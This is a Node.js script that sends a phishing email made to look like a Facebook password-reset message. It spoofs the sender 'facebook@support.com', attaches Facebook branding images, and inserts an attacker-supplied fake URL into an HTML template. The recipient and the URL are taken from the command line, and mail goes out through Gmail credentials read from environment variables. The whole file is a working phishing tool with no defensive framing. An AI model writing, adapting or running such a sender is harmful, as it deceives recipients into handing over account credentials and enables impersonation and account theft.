const mailer = require("nodemailer");
const fake_mail = require("./utils/fake_mail").fake_mail;

const correo = process.argv[2];
const url_fake = process.argv[3];
const path = require("path");

var transporter = mailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.MICORREO,
    pass: process.env.MIPASSWORD
  }
});

const enviarCorreo = async (mail, correo) => {
  try {
    const mailOptions = {
      from: "facebook@support.com", // sender address
      to: mail, // list of receivers
      subject: "Restauracion de contraseña", // Subject line
      html: fake_mail("Hola", url_fake), // plain text body,
      attachments: [
        {
          filename: "facebook.png",
          path: path.join(__dirname, "utils", "facebook.png"),
          cid: "logo"
        },
        {
          filename: "information.png",
          path: path.join(__dirname, "utils", "information.png"),
          cid: "info"
        },
        ,
        {
          filename: "question.png",
          path: path.join(__dirname, "utils", "question.png"),
          cid: "ques"
        },
        ,
        {
          filename: "time.png",
          path: path.join(__dirname, "utils", "time.png"),
          cid: "clock"
        },
        ,
        {
          filename: "gps.png",
          path: path.join(__dirname, "utils", "gps.png"),
          cid: "gps"
        }
      ]
    };
    transporter.sendMail(mailOptions, err => {
      if (err) throw Error(err);
    });
  } catch (error) {
    console.log("====================================");
    console.log(error);
    console.log("====================================");
  }
};

enviarCorreo(correo, url_fake);

console.log("====================================");
console.log(correo, url_fake, process.argv);
console.log("====================================");
